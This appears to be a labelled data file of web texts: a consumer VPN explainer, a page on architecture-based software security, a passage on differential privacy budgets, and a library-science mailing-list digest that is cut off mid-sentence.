{"text": "A Virtual Private Network (VPN) is a network technology that is used to link multiple computers, servers and any VPN-capable devices through private or public and secured web tunnels. VPN also make use of an encryption system in the transmission of data; hence keeping every bit of information being transmitted from one system to another as secured as possible and therefore can only be accessed by the authorized recipient/s.\nUsing a VPN let you enhance your web browsing security by accessing information through secure VPN tunnels, bypass censorships and access online content without hassles, and change Your IP and Server for added web browsing anonymity.\nIn reality, a Virtual Private Network is just a network of different computers, network devices or servers that are connected either through the private or the public domain using secure tunnels. This means that a VPN is not entirely different from a LAN or a WAN, but the data transmission usually happens over a secure network, immaterial of the medium of transfer.\nData transfer is of paramount importance for any organization and individuals alike. In the olden days, data transfer was made through secure, storable and transportable mediums such as discs, and it usually involved a lot of risk and was considered to be time consuming.\nHowever, with access to internet, it has become possible for various organizations and companies to connect their different satellite offices together and make the process of data transfer both fast and seamless. This has allowed various companies to set up shop in different countries around the globe.\nThis even led to a rise in the number of professionals who started working out of their homes or tiny satellite offices that were set up in convenient locations to reduce the overall costs. But fast, easy and cheap data transfer over the internet led to another issue, SECURITY.\nData transfer over the internet offers the least security. Various hackers, viruses and malicious programs are constantly on the lookout for gaining access to confidential and sensitive data that will give them an opportunity for making financial gains. And leasing special lines across these distances can prove to be extremely expensive. A VPN on the other hand, allows the company to connect via the internet and use the security of secure VPN tunnels. These tunnels are basically encrypted connections created by connecting the devices through intermediary servers often hosted by VPN service providers.\nLarge companies and Government organizations usually develop their own Virtual Private Networks to manage large projects and host the servers and experts in-house. But managing and hosting a VPN can prove to be quite expensive for smaller companies and individuals, which is why there are dedicated VPN service providers who will look after the technical aspects of managing a VPN, while the subscribers can enjoy VPN services for a small monthly subscription fee.\nHow does VPN Work?\nVPN works through a complex process of traffic rerouting and encrypting. While the detailed explanation can include quite a few technical details and server information, in simpler terms, a VPN works by rerouting your traffic, which is in turn done by connecting your device first to an anonymous VPN server, before proceeding towards your intended online action path. Therefore, the primary duty of a VPN is to connect your device to a VPN server, after which, all the actions and paths will originate from the VPN server itself.\nTo better understand the concept, you will need to know about the effects your IP on your browsing experience. Every ISP provides a dedicated, or in other cases dynamic, IP for each user. Your dedicated IP address is representative of your actual geographical location, which is the single-most factor that determines your online presence. Even if your ISP provides you with a dynamic IP, the actions performed by you on the network can be traced back to you. This data is often used by websites, Government agencies and other organizations to track your online behavior, censor internet content and outright block you from accessing any online information.\nBy connecting using a VPN, you can entrust the VPN server to lift all the heavy load, and every action performed by you will only be tracked back to the anonymous VPN server, not your actual IP address. This is something that attracts most users to a VPN service provider, and security of online browsing is just an added bonus.\nRead more: List of top VPN providers\nWhat are the differences between VPN and proxy?\nBoth of these technologies are used to change your IP address. However, they differ in operations (e.g. how they re-route network traffic and change IP addresses). Proxy server is a server that acts as a filter. When using proxy in protecting your internet activities, you have to setup first your internet browser with the correct proxy settings. This means that you can only have secured internet activities when you’re browsing through an internet browser that has proxy settings setup to it.\nFor VPN, users simply need to install the VPN client software and that’s about it – no need to make tweaks with the internet browsers. Every time users browse the internet, they simply need to connect the VPN client app first to have safe and private internet browsing experiences. The advantage of VPN over proxy is that the former can be used for any internet-capable devices/applications while the latter only works with internet browsers. So what technology offers more secured connections? It has to be VPN, no doubt about that.\nRead more: Premium VPN vs Free VPN vs Free Web Proxies\nWhat are the different types of VPN protocols?\nThere are various types of VPN protocols that people can use to have secured internet connections. Here are the most commonly used VPN protocols.\n• Point-to-Point Tunneling Protocol (PPTP)\n• Internet Protocol Security (IPSec)\n• Secure Socket Tunneling Protocol (SSTP)\n• Layer Two Tunneling Protocol (L2TP)\nPPTP and L2TP/IPsec are the more preferred types of protocols because they are the fastest security protocols available today. SSTP and OpenVPN are the best when it comes to security. However, more secured connections means more encryptions; therefore slowing down the connection and browsing experiences on SSTP and OpenVPN.\nRead more: Learn about the different VPN protocols\nWhy use VPN?\nThere are several benefits of using a VPN service. There isn’t any particular end user or customer specific demographic as far as VPN usage is concerned. From the very outset, VPN can be made useful for the average internet browser, and the benefits may increase from individual user to large organizations.\nFrom an everyday internet user’s perspective, security of online browsing is the key, especially if the user is prone to use various financial related websites and make financial transactions through online payment processors. Along with security, the user may also remain anonymous and can avoid leaving tracks.\nA VPN can also be used for accessing blocked content. Internet censorship is a serious issue across several countries throughout the world. Many popular online websites, social media sites and even entertainment channels are blocked for various reasons. Facebook, Twitter and YouTube are just a small group of websites that are blocked in countries like China, Iran, Egypt and more. Therefore, citizens of these countries can utilize the services of a VPN service provider to gain access to blocked content.\nThere are country specific online entertainment websites such as Netflix, Hulu, iPlayer, CBS, etc, that only allow users from a specific country to access their services. For instance, the entire range of Netflix services is only accessible to U.S users, while the BBC iPlayer is only accessible to U.K viewers. Therefore, to watch these channels from a different country, users will need access to VPN.\nFor companies and organizations, VPN can be helpful in connecting various entities together, and immaterial of the actual physical distance between them, every device can be connected to a same network using VPN without any security issues. This will allow greater flexibility for operations and will allow fast, easy and secure transfer of data from one point to the other.\nRead more: What are the 5 main benefits of using a VPN?", "label": 1}
{"text": "Architecture-based Security & Trust\nTraditional security research has focused on how to provide assurance of confidentiality, integrity, and availability. However, most security vulnerabilities result from poor software design and implementation: for a whole system to be secure, all relevant components must collaborate to ensure the security of the system. Thus, approaches to designing secure software are needed, not just from a traditional cryptology viewpoint, but from a software engineering perspective. — Jie Ren\nMost security vulnerabilities result from poor software design and implementation. A more disciplined approaches to utilizing existing technologies may significantly improve the security of a complex, componentized, and networked software systems.\nSecurity is an emergent property, so it is insufficient for a component to be secure. For the whole system to be secure, all relevant components must collaborate to ensure the security of the system.\nDecentralized systems have no central authority, parties (or peers) making up the system must make local, autonomous decisions based on their individual goals. This introduces a need for determining trust between peers in a system. Trust in decentralized architectures are discussed further on our Decentralized Software Architectures page.\nExplicitly model security at the architectural level. Modeling security of systems can be done explicitly, at the architectural level, using a secure architecture description language. Connectors provide a suitable vehicle to model, capture, and enforce security policies.\nExplicitly model security in the architecture. By incorporating access control model concepts into an architecture description, it is possible to determine whether access to a particular resource should be granted through analysis of the architecture topology and privileges of its constituent elements.\nUse architecture styles to create trust enabled, decentralized applications. A trust-enabled architectural style for decentralized systems can identify and support common functionalities intrinsic to every peer: communication, information, trust, and application allowing decentralized applications to be built without reinventing the wheel.\n- Secure xADL - an extension to xADL that describes security properties of software architectures using XACML.\n- PACE - Practical Architectural approach for Composing Egocentric trust - An architectural style that provides comprehensive guidance on addressing many different decentralized security threats. It supports different trust models, which determine trust based on different categories of information.\n- Architecture Access Control - an extension to ArchStudio 3.0 that edits, checks, and executes architectures described with access control policies.\n- PACE reference architecture - used to implement decentralized auctioning, file-sharing, and common-operational picture prototypes\n- Our work on Decentralized Software Architectures\n- Towards An Architectural Treatment of Software Security: A Connector-Centric Approach (SESS 05)\n- A Call to Action: Look Beyond the Horizon (IEEE Security & Privacy 2003)", "label": 1}
{"text": "With a differentially private algorithm, there’s no need to analyze a question carefully to determine whether it seeks to invade an individual’s privacy; that protection is automatically built into the algorithm’s functioning. Because prying questions usually boil down to small numbers related to specific people and non-prying questions examine aggregate-level behavior of large groups, the same amount of added noise that renders answers about individuals meaningless will have only a minor effect on answers to many legitimate research questions.\nWith differential privacy, the kinds of issues that plagued other data releases — such as attackers cross-referencing data with outside information — disappear. The approach’s mathematical privacy guarantees do not depend on the attacker having limited outside information or resources.\n“Differential privacy assumes that the adversary is all-powerful,” McSherry said. “Even if attackers were to come back 100 years later, with 100 years’ worth of thought and information and computer technology, they still would not be able to figure out whether you are in the database. Differential privacy is future-proofed.”\nA Fundamental Primitive\nSo far, we have focused on a situation in which someone asks a single counting query about a single database. But the real world is considerably more complex.\nResearchers typically want to ask many questions about a database. And over your lifetime, snippets of your personal information will probably find their way into many different databases, each of which may be releasing data without consulting the others.\nDifferential privacy provides a precise and simple way to quantify the cumulative privacy hit you sustain if researchers ask multiple questions about the databases to which you belong. If you have sensitive data in two datasets, for example, and the curators of the two datasets release those data using algorithms whose privacy parameters are Ɛ1 and Ɛ2, respectively, then the total amount of your privacy that has leaked out is at most Ɛ1+ Ɛ2. The same additive relationship holds if a curator allows multiple questions about a single database. If researchers ask m questions about a database and each question gets answered with privacy parameter Ɛ, the total amount of privacy lost is at most mƐ.\nSo, in theory, the curator of a dataset could allow researchers to ask as many counting queries as he wishes, as long as he adds enough Laplace noise to each answer to ensure that the total amount of privacy that leaks out is less than his preselected privacy “budget.”\nAnd although we have limited our attention to counting queries, it turns out that this restriction is not very significant. Many of the other question types that researchers like to ask can be recast in terms ofcounting queries. If you wanted to generate a list of the top 100 baby names for 2012, for example, you could ask a series of questions of the form, “How many babies were given names that start with A?” (or Aa, Ab or Ac), and work your way through the possibilities.\n“One of the early results in machine learning is that almost everything that is possible in principle to learn can be learned through counting queries,” Roth said. “Counting queries are not isolated toy problems, but a fundamental primitive” — that is, a building block from which many more complex algorithms can be built.\nBut there’s a catch. The more questions we want to allow, the less privacy each question is allowed to use up from the privacy budget and the more noise has to be added to each answer. Consider the baby names question. If we decide on a total privacy budget Ɛ of 0.01 and there are 10,000 names to ask about, each question’s individual privacy budget is only Ɛ/10,000, or 0.000001. The expected amount of noise added to each answer will be 10,000/Ɛ, or 1,000,000 — an amount that will swamp the true answers.", "label": 1}
{"text": "Internet's Impact on Museums and Libraries\nOpen Lib/Info Sci Education Forum [JESSE@listserv.utk.edu]; on behalf of; Kevin OConnell [KOConnell@IMLS.GOV]\nJESSE@listserv.utk.edu Fri 7/03/2008\nFOR IMMEDIATE RELEASE\nMarch 6, 2008\nIMLS Press Contacts\nJeannine Mjoseth, email@example.com\nMamie Bittner, firstname.lastname@example.org\nWanda Monroe, email@example.com\nIMLS Announces Results of Study on the Internet's Impact on Museums and Libraries\n\"Museums and libraries are alive and well in the digital world!\" Radice said. \"The InterConnections report shows how people currently search for information and makes the case that the libraries and museums must provide service both online and in person.\"\nIMLS sponsored this national\nstudy through a cooperative agreement with a\nLibraries and museums are the most trusted sources of online information among adults of all ages, education levels, races, and ethnicities. Libraries and museums rank higher in trustworthiness than all other information sources including government, commercial, and private Web sites. The study shows that the public trust of museums and libraries migrates to the online environment.\nThe explosive growth of information available in the \"Information Age\" actually whets Americans' appetite for more information. People search for information in many places and since the use of one source leads to others, museums, public libraries, and the Internet complement each other in this information-rich environment.\nThe Internet is not replacing in-person visits to libraries and museums and may actually increase onsite use of libraries and museums. There is a positive relationship between Internet use and in-person visits to museums and public libraries.\nThe InterConnections report provides evidence that public libraries and museums are thriving in the Internet Age as trusted providers of information to people of all ages.\nTo view the report, please go to http://interconnectionsreport.org <http://interconnectionsreport.org> .\nThe 2008 WebWise Conference on Libraries and Museums in the Digital World on March 6, 2008. The annual late winter WebWise Conference draws museum, library, information systems, and other professionals to explore new research and innovation in digital technology. The 2008 conference, co-hosted by IMLS and The Wolfsonian–Florida International University (The Wolfsonian–FIU), with support from the National Endowment for the Humanities, highlights the growing convergence between libraries and museums in collection and information management. For more information, go to http://webwise2008.fcla.edu <http://webwise2008.fcla.edu> .\nJoint use conference proceedings now available\nOpen Lib/Info Sci Education Forum [JESSE@LISTSERV.UTK.EDU]; on behalf of; Sarah McNicol [ebase@HOTMAIL.CO.UK]\nJESSE@LISTSERV.UTK.EDU Mon 5/11/2007\nFor any public, academic, special or school library considering any form of joint/dual use library or library based service partnership.\nFull proceedings of the\nfirst International Joint Use Libraries Conference,\nTwenty-six papers from\nOverseas $70.00 plus $20.00 p&h each\nFrom Auslib Press,\nFax (08)8278 4000 International +61 8 8278 4000\nJSC document 2008/01/25\nMcGarry, Dorothy [firstname.lastname@example.org] SLA-DST Sun 27/01/2008\nThe following document was posted on the JSC Web site on 2008/01/25:\n- 5JSC/Chair/9/Chair follow-up/6 [Appendix on initial articles]\nKnowledge 2008: Map of Human Knowledge\nchaim Zins [email@example.com] firstname.lastname@example.org Wed 6/02/2008\nDear Friends & Colleagues,\nKnowledge 2008 is an ongoing R&D project aimed at mapping human knowledge and facilitating efficient information searching. The project is composed of 6 parts:\nMap, Portal, Smart Search, Encyclopedia, Overview, and Forum:\nKnowledge 2008: Map of Human Knowledge <http://www.success.co.il/knowledge/Map/Map.html>\nOverview. A systematic map of human knowledge. The knowledge map maps 500 major fields. Human knowledge is composed of 10 pillars. Each pillar is divided into relevant categories and presents the relevant field.\nUnique characteristics. To better evaluate the map let us look at its unique characteristics:\n1. The 10 pillar structure, which is based on the Knowledge - Supernatural - Universe - Humans model is unique.\n2. The distinction between categories of the map (e.g., Theory) and fields of knowledge (e.g., Philosophy of Knowledge) is unique.\nImagine that the Map mirrors a library. The pillars are bookcases. The categories are shelves, and the fields of knowledge are books. The Library of Human Knowledge has 10 bookcases, 100 shelves, and a collection of 500 books.\n3. The Theory - Embodiment structure is unique. The map has a Theory - Embodiment structure. It is manifested within the map level, the pillar level, and the field level.\n[in the map level: Pillar 1 is 'the theory' part of human knowledge (HK). It is composed of the meta-knowledge of HK. Pillars 2-10 are 'the embodiment' of HK. They are composed of our knowledge on the explored phenomena (the supernatural, the universe, the living world, and humans. In the pillar level: Each pillar has 'a theory' category. In the field level: Each field has 'a theory' sub-field (e.g., Philosophy of Medicine, Literary Theory, Philosophy of Art)\n4. The categories of the map were formulated in this research.\nKnowledge 2008: Portal to Human Knowledge <http://www.success.co.il/knowledge/Portal/Portal.html>\nOverview. A systematic portal to top quality resources. Currently, the portal includes hundreds links to top resources in all fields of knowledge.\nKnowledge 2008: Smart Search <http://www.success.co.il/knowledge/search/index.html>\nOverview. A systematic user interface of Internet search engines. It is designed to facilitate an efficient information searching. Currently, it is implemented for Google search engine.\nRationale. Search words are essential for formulating effective search queries. Unfortunately, most searchers are not familiar with the relevant search terms. It is assumed that in every field there are main keywords that relate to the core knowledge of the field. The idea is to develop a systematic user interface that presents the main keywords in the major fields of knowledge.\nKnowledge 2008: Encyclopedic Portal to Wikipedia <http://www.success.co.il/knowledge/encyclopedia/index.html>\nOverview. A systematic portal to the Wikipedia Encyclopedia. The portal implements the knowledge map for facilitating systematic access to Wikipedia's encyclopedic articles.\nRationale. Wikipedia is a general encyclopedia. It is free and popular. Undoubtedly, Wikipedia is a significant international, intercultural, and interdisciplinary project despite the poor quality of many articles. Note that the map can be implemented in other encyclopedias.\nA concise overview of the knowledge map.\nAn academic and professional forum (via email) on the theoretical and practical aspects of the project.\nPlease feel free to reflect. Thanks.\nKnowledge 2008 <http://www.success.co.il/knowledge/index.html> : Map <http://www.success.co.il/knowledge/Map/Map.html> - Portal <http://www.success.co.il/knowledge/Portal/Portal.html> - Encyclopedia <http://www.success.co.il/knowledge/encyclopedia/index.html> - Smart Search <http://www.success.co.il/knowledge/search/index.html> - Overview <http://www.success.co.il/knowledge/overview/1.html> - Forum <http://www.success.co.il/knowledge/Forum/Forum.html>\nKnowledge Map of Information Science <http://www.success.co.il/is/index.html>\nChaim Zins, PhD.\nKnowledge Mapping Research\nHomepage: www.success.co.il <http://www.success.co.il/> Knowledge 2008: Map of Human Knowledge\nLC releases final report on future of bib control\nOpen Lib/Info Sci Education Forum [JESSE@LISTSERV.UTK.EDU]; on behalf of; B.G. Sloan [bgsloan2@YAHOO.COM]\nJESSE@LISTSERV.UTK.EDU Fri 11/01/2008\nLibrary of Congress Subject Headings report\nMcGarry, Dorothy [email@example.com] Science-Technology Division Wed 5/03/2008\nFrom: Miller, David [mailto:firstname.lastname@example.org]\nSent: Tuesday, March 04, 2008 7:21 AM\nSubject: [ccs-sac] Library of Congress Subject Headings report\nHello, everyone -\nPardon me if you've all seen this announced already (I'm only on a couple of mailing lists and look at a handful of blogs), but this doesn't seem to have received a lot of play yet.\nThe report \"Library of Congress Subject Headings: Pre- vs.\nPost-Coordination and Related Issues\" is out from CPSO, and is available at http://www.loc.gov/catdir/cpso/pre_vs_post.pdf.\nMark Perkins lists [email@example.com] firstname.lastname@example.org Thu 1/11/2007 5:52 PM\nISOC Netherlands and ISOC Belgium participate in the launch of OpenDoc Society\nA new member-based organisation, OpenDoc Society, will try to bring a global community of users, technologists, and decision makers together around Open Document Format (ODF). The OpenDoc Society will be trying to build a community around the Open Document Format (ISO 26300:2006) and related document standards as key technologies for our society and the Internet in a pre-competitive way.\nOpen Document Format (ODF) is an OASIS/ISO-standardized, vendor neutral file format that enables cross-platform collaboration between people and many different types of applications - from Office suites to server software. Having such a standard will re-establish full ownership of documents to users, guaranteeing unhindered access to content now and in the future. At the same time, it will contribute to interoperability and innovation across platforms and applications. This will help people work more efficiently and take away the dependency on specific software companies and versions of software for having access to one's own content. It is not about converting people to use specific software. It promotes all ODF-based technology alike: may the best offering in any given situation win. This pragmatic and positive approach is what makes the OpenDoc Society unique. A growing number of governments, including the Dutch, Belgian, South-African and Danish governments, is moving away from the proprietary formats such as .doc, .wpd and .xls and converting to ODF.\nOn 23 October 2007, the new\ninitiative was launched with a large event in the Royal Library in\nThe founding board of\nOpenDoc Society will consist of Bert Bakker (director of Center for Media and\nCommunication, and former member of the\nThe organization wants to expand internationally and hopes it can play a strategic role in creating awareness and building a community to further the growth of ODF. More information can be found at:\nThere is already interest from a number of ISOC chapters to set up local branches. If you want to start a chapter of OpenDoc Society in your region, contact: email@example.com or alternatively contact one of the people below:\nISOC Netherlands, NLnet foundation\nPhone: +31 (0)20 8884251\nCell phone: +31 (0)6 27050947\nSIP: michiel [@t] isoc.nl\nmachtelt.garrels [@t] isoc.be\nM: +32 (0)473 94 68 78\nIf you have any questions regarding your membership please contact ISOC membership team at <membership at isoc.org>.\nCopyright (c) 2007 Internet Society. Permission to duplicate and redistribute in any form is granted as long as this copyright and this notice remain intact.\nPioneers in Information Management Scoop Top Awards\nFederation for Information & Documentation [LIS-FID@JISCMAIL.AC.UK]; on behalf of; DCSA DST-IM4 [DCSADST-IM4@DEFENCE.MOD.UK] LIS-FID@JISCMAIL.AC.UK Wed 28/11/2007\nPIONEERS IN INFORMATION MANAGEMENT SCOOP TOP AWARDS\nUKeiG are delighted to\nannounce today the winners of the Strix and Jason Farradane Awards, which will\nbe presented at the Online Information conference and exhibition at\nBoth awards celebrate achievement in the broad field of information management. The 2007 Strix Award, created in honour of Dr Tony Kent, is made to Mats Lindquist, senior executive officer at the National Library of Sweden.\n\"We're delighted to award the tenth annual Strix Award to Professor Lindquist, \"said Adrian Dale, editor of The Journal of Information Science and Online Information conference chairman. \"In the world of practical full text information retrieval he is one of the \"giants\", wholly in the spirit of Tony Kent's contribution in chemical information\".\nProfessor Lindquist won the\nStrix Award for his key role in the development and significant improvement in\naccessibility to an information service through the business development of\nThe Jason Farradane Award, which recognises brilliant work in information science, is made to executive director of Intute, Caroline Williams and the Intute community network. Intute is a free online service, created in partnership with university subject specialists, with over 100,000 links to academic content on the web, as well as a suite of virtual training tutorials and internet information services.\nAdrian Dale praised highly\nthe winners. \"Intute is a great\nexample of the\nIntute's origins lie in the 1996 Electronic Libraries programme, where a number of librarians and researchers won JISC (Joint Information Systems Committee) funding to develop their ideas for new Internet gateway services. The service has thrived as it has always actively pursued exploring original ways of working online, as a community. Intute has also innovated with new technologies - such as Web 2.0 - but always against balanced judgements about their relative value to education and research.\nThe Awards will be presented\nat the Online Conference to be held from 4 - 6 December at\nCONTACT: Chris Armstrong, UKeiG and Information Automation Ltd\nTel: (+44) 1974 251302\nNOTES FOR EDITORS\nUKeiG is an established professional group for all information professionals, users and developers of electronic information resources. The Group encourages communication and the exchange of best practice and knowledge across all sectors; and offers an e-journal, a mailing list, an annual programme of training courses; and an array of awards and bursaries. UKeiG is a Special Interest Group of CILIP: the Chartered Institute of Library and Information Professionals. www.cilip.org.uk\nSAGE is a leading\ninternational publisher of journals, books, and electronic media for academic, educational, and professional\nmarkets. Since 1965, SAGE has helped\ninform and educate a global community of scholars, practitioners, researchers,\nand students spanning a wide range of subject areas including business,\nhumanities, social sciences, and science, technology and medicine. An independent company, SAGE has principal\nThe Journal of Information Science is an international journal of high repute covering topics of interest to all those researching and working in the sciences of information and knowledge management. The Journal seeks to achieve a better understanding of the principles that underpin the effective creation, organization, storage, communication and utilization of information and knowledge resources. It also seeks to understand how policy and practice in the area can be built on sound theoretical or heuristic foundations to achieve a greater impact on the\nworld economy. http://jis.sagepub.com/\nThe Strix Award is presented\nin memory of Dr Tony Kent, a past Fellow of the\nPast winners have been Stella Dextre Clarke (2006); Jack Mills (2005); Professor Cornelis Joost (Keith) van Rijsbergen (2004); Dr Herbert van Sompel (2003); Malcolm Jones (2002); Professor Peter Willett (2001); Dr Martin Porter (2000); Dr Donna Harman (1999); Professor Stephen Robertson (1998).\nJason Farradane graduated in\nchemistry in 1929 at what is now\nthe Centre for Information Science in 1966. On the research side his main contributions lay in relational analysis, which can now perhaps be seen as providing a precursor to work in the area of A.I., and the concept of information. He saw information science as a step towards understanding and better organizing ourselves. The IIS first presented the award in 1979, to Jason Farradane.\nPrevious award winners have\nProceedings of the 1st African Information Ethics Conference\nfirstname.lastname@example.org; on behalf of; M.J. Menou [email@example.com] firstname.lastname@example.org; sigiii-l; sigifp-l; eurchap Tue 30/10/2007\nThe 7th volume of IRIE\n(01/2007) is dedicated entirely to the publication of the proceedings of the\nfirst African Information Ethics Conference (www.africainfoethics.org <http://www.africainfoethics.org>)\nthat was held in February, 5-7, 2007 in\nDr. Michel J. Menou\nVisiting Professor, SLAIS,\nConsultant in ICT policies\nand Knowledge & Information Management Adviser of Somos@Telecentros board http://www.tele-centros.org Member of\nthe founding steering committee of Telecenters of the Americas Partnership http://www.tele-centers.net/ B.P. 15\nF-49350 Les Rosiers sur\nPhone: +33 (0)2 41511043\nPublishing trade associations issue clear rules for Orphan works \"safe harbor\" for users of academic and scholarly journals\nMark Perkins lists [email@example.com] firstname.lastname@example.org Fri 26/10/2007\nPublishing trade associations issue clear rules for Orphan works \"safe harbor\" for users of academic and scholarly journals\nLONDON, 24 October 2007 - Three trade associations, The Association of Learned and Professional Society Publishers (ALPSP), The International Association of Scientific, Technical & Medical Publishers (STM) and the Professional /Scholarly Division (PSP) of the Association of American Publishers today released a further step towards establishing clear rules for users of copyright works who cannot locate the owners of such works (so-called \"orphan works\") to obtain permission to include such content in new works, course-packs, and compilations. The \"safe harbor\"\nstatement we are releasing today is an evolution in policy and practice from statements and positions announced previously (see prior STM, IPA and AAP\nStakeholders around the world are currently debating whether orphan works should be dealt with as a matter of a copyright exception, a reduction in copyright penalties once a \"parent\" is located, or a blanket collective license. The view of ALPSP, STM and PSP is that private market solutions are almost always to be preferred, since they are the most likely to provide tangible results, and that solution is put forward in the new \"safe harbor\"\nThe safe harbor document outlines a need for a viable and diligence search request, and identifies resources that should be consulted, including a list of journal publisher imprints that the associations have compiled. Users who conduct such a search where the owner of such a work is later identified, will be subject only to a normal license fee and will not be subject to any statutory, punitive or special fees or damages.\nA significant number of ALPSP, STM and PSP members have acceded to the safe harbor principles, and it is hoped many more will join shortly. In a sense this effort creates an actual legal right that would otherwise only be available through extensive formal legislation.\nThe safe harbor that members of the three associations are providing will significantly increase the ability of scholarly users, researchers and writers, to utilize the rich resources of scholarly and academic journal content for the benefit of all.\nThe Association of Learned and Professional Society Publishers (ALPSP) is the international trade association for not-for-profit publishers and those who work with them. http://www.alpsp.org\nSTM - International Association of Scientific, Technical and Medical Publishers - is an international association of about 100 scientific, technical, medical and scholarly publishers, collectively responsible for more than 60% of the global annual output of research articles, over half the active research journals and the publication of tens of thousands of print and electronic books, reference works and databases.\nThe Professional & Scholarly Publishing (PSP) Division of the Association of American Publishers, Inc. (AAP) serves over 140 commercial, not-for-profit, and university press publishers who provide scholarly information in the sciences, technology, medicine, business, law, and the humanities and social sciences. PSP engages in educational and advocacy activities for the advancement of scholarship and the broad interests of information services community. http://www.pspcentral.org\nFor further information, please contact: Mark Seeley\nEU Information Officer\nTel.: + 31 70 309 05 52\nFax: + 31 70 309 05 58\nLobbying for Archives and Libraries\nRDA Vocabularies work begun\nMcGarry, Dorothy [email@example.com] Science-Technology Division Thu 21/02/2008\nAnnouncement: Work Begins on the RDA Vocabularies\nThe DCMI/RDA Task Group was\nformed in April of 2007, when members of the Joint Steering Committee for the\nDevelopment of RDA, Dublin Core and the W3C Semantic Web Deployment Working\nGroup met in\n1. definition of an RDA Element Vocabulary\n2. disclosure on the public web of RDA Value Vocabularies using RDF/RDFS/SKOS technologies\nThe RDA Vocabularies Project proposes to surface these underlying bibliographic elements in the form of Semantic Web vocabularies, thereby making them reusable in Semantic Web applications and citable with Uniform Resource Identifiers (URIs). This will be based on RDF (Resource Description Framework), a generic grammar for expressing data for use not just by humans, but also in automated processes of data integration and \"intelligent\" reasoning.\nThe work will be lead by the\nDCMI/RDA Task Group chairs: Gordon Dunsire of the\n* Karen Coyle (independent consultant well known in the library world)\n* Alistair Miles (editor for the Simple Knowledge Organization System (SKOS) and member of the W3C SWDWG)\n* Mikael Nilsson (researcher in the Knowledge Management Research Group, Royal Institute of Technology, Sweden and co-chair of the DCMI Architecture Forum)\nPartial funding for the effort has been secured, and sources of additional funding are still being sought. Potential funders should contact Diane Hillmann at firstname.lastname@example.org for further information.\nPublic information on the progress of the project is available on the DCMI/RDA Task Group wiki, see: http://dublincore.org/dcmirdataskgroup/. Continuing discussion on the work of the Task Group will take place on the public mailing list maintained by the task group and available for open subscription at: http://www.jiscmail.ac.uk/lists/dc-rda.html. Feedback, comment and experimentation with the products that the group will be presenting is both welcome and essential to the success of the work.\nSOCRS (Serials and Other Continuing Resources Section) - proceedings\nAnn Okerson [email@example.com] IFLA mailing list Tue 26/02/2008\nWe are very happy to let you know that the proceedings of our August 2007 SOCRS (Serials and Other Continuing Resources Section) satellite conference are now up on line at the Web site, located at:\nThe title of this satellite conference was: ELECTRONIC RESOURCE MANAGEMENT SYSTEMS: A Solution with Its Own Challenges, held at the University of the Western Cape, Cape Town, South Africa August 16-17, 2007. The papers presented are of an exceptional caliber and bring together state of the art information about ERMS, which will be of value to librarians in many institutions around the world.\nWhen you click on \"Papers,\" you will arrive at the section where the speakers' abstracts and full text presentations are available.\nThe Speakers' bios are all available on the link called \"Speakers.\" The full contents are listed below.\nEditing of the papers was\ndone over the last few months by Graziano Kratli, International Program Support\nLibrarian at Yale University Library, and we owe him immense gratitude for this\npainstaking work. We also owe, again,\nhuge thanks to the various SOCRS members who helped to plan and organize this\nevent, as well as to our hosts at the University of the\nAs they say, \"enjoy\" this substantive contribution to current serials and library work, and please share this information with your various e-mail lists and contacts.\nCordially, Ann Okerson\nChair, Serials and Other Continuing Resources Section Associate University Librarian, Collections & International Programs Yale University Library firstname.lastname@example.org\nRochelle BALLARD and Jennifer LANG\nThe Hidden Benefits of Implementing an Electronic Resources Management System. Text & PPT\nRobert BLEY (Ex Libris)\nDis-Integration and Re-Integration: ERMSs in the Wider Context - Predictions. Text & PPT.\nRichard BURKE (SCELC)\nA Consortial Approach to Information Management. Text & PPT.\nTed FONS ( Innovative Interfaces)\nThe Present and Future of Electronic Resource Management Systems: Public and Staff. Text & PPT.\nBrian GREEN (EDItEUR)\nLicenses and ERMs: Standards for the Expression of Publisher/Library Licenses. Text & PPT.\nDalene HAWTHORNE (\nKimberly PARKER (\nText & PPT.\nOliver PESCH (EBSCO Information Services) Connecting E-Resource Management Systems and Usage Statistics. Text & PPT.\nDorette SNYMAN (\nWilhelm WIDMARK (\nAlicia WISE (Publishers Licensing Society) Electronic Resource Management: Copyright and Licensing Context Presentation. PPT only.\nFederation for Information & Documentation [LIS-FID@JISCMAIL.AC.UK]; on behalf of; Paul Nieuwenhuysen [pnieuwen@VUB.AC.BE]\nLIS-FID@JISCMAIL.AC.UK Wed 7/11/2007\nAn International Training Program on \"INFORMATION\":\nScientific and Technological Information Management in Universities and Libraries:\nan Active Training Environment (Edition 8) Announcement\nInformation about this training program can be found on the WWW starting from:\nThe program is planned to\ntake place mainly in\nOctober 1 - December 19, 2008. Language used is English.\nOur motto is: \"Helping educators and innovators to advance knowledge and to enrich lives\"\nContext and evolution of the program: The initiative has been approved by the Flemish\nInteruniversity Council (VLIR) and is sponsored by the Belgian Government (the directorate named\nDGOS since December 2002). This fits in a series of similar international training activities that\nhave been organized since 1991, named MIST 1, 2, 3, KNOW-HOW, and STIMULATE 1, 2, 3, 4, 5, 6 and 7.\nThis initiative is aimed primarily at persons with a university degree (Bachelor or Master),\nwho work in universities, information and documentation centres, and libraries, including\nof course university libraries, and who have a few years of practical experience.\nThe term Active Training Environment in the title of the training program reflects our wish to\ncreate an environment in which each participant is stimulated to get involved actively, supported\nby the lecturers and the infrastructure provided by the training program. This fits well into the\ngeneral, worldwide trend away from \"teaching\" to \"learning management\".\nAim / goal of the training program:\nThe main aim and goal of this International Training Program is to offer a stimulating\nlearning environment to the participants. These are young scientists and professionals who have a\nfunction as information intermediary in the area of science and technology, so as to sharpen their\nskills in collecting, storing, retrieving, presenting and managing information. This can be\nof great benefit to the teaching and research activities going on in their institute and to the\nfurther development of their organisation and region. This initiative corresponds well with the basic,\ngeneral aim of all the International Training Programs that are supported by VLIR: to train\nyoung scientists and professionals from developing countries in a domain that is relevant\nfor the further development of the country, and to stimulate the participants to transfer their\nincreased knowledge and skills to their colleagues and other stakeholders in their home country.\nMore specific objectives of the training program: -- to provide participants with a clearer view on\nthe importance of information in general and for their environment in particular, and on how to manage information:\nsummarised: \"Management in libraries and information centres\"\n-- to learn the participants to cope with modern technology, in view of the increasing importance of ICT;\nsummarised: \"Information and communication technology for libraries and information centres\"\n-- to guide them in retrieving information that is publicly accessible on an international scale:\nsummarised: \"Information retrieval/searching\" and\n-- to learn them to store, organise, present, manage, publish information resources at\npersonal, institutional, regional or national level: summarised: \"Information architecture\"\nAfter being actively involved in this International Training Program, every participant\nwill have improved the ability\n-- to appreciate and explain the importance of access to information for their organisation\n-- to present information to users and potential users, using appropriate information technology\n-- to train interested persons in the use and management of information, using appropriate presentation techniques\n-- to contribute to the planning of the (further) 